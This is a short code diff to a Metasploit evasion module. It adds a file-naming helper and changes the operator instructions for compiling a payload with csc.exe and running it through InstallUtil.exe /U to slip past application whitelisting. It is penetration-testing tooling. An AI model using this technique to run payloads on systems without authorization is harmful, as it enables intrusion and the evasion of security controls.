@@ -87,19 +87,31 @@ class MetasploitModule < Msf::Evasion
     HEREDOC
   end
 
+  def file_format_filename(name = '')
+    name.empty? ? @fname : @fname = name
+  end
+
+  def create_files
+    f1 = datastore['FILENAME'].empty? ? 'install_util.txt' : datastore['FILENAME']
+    f1 << '.txt' unless f1.downcase.end_with?('.txt')
+    file1 = install_util
+    file_format_filename(f1)
+    file_create(file1)
+  end
+
   def instructions
     print_status "Copy #{datastore['FILENAME']} to the target"
     if payload.arch.first == ARCH_X86
-      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
-      print_status 'Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe'
+      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}"
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}"
     else
-      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
-      print_status 'Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe'
+      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}"
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}"
     end
   end
 
   def run
-    file_create(install_util)
+    create_files
     instructions
   end
 end
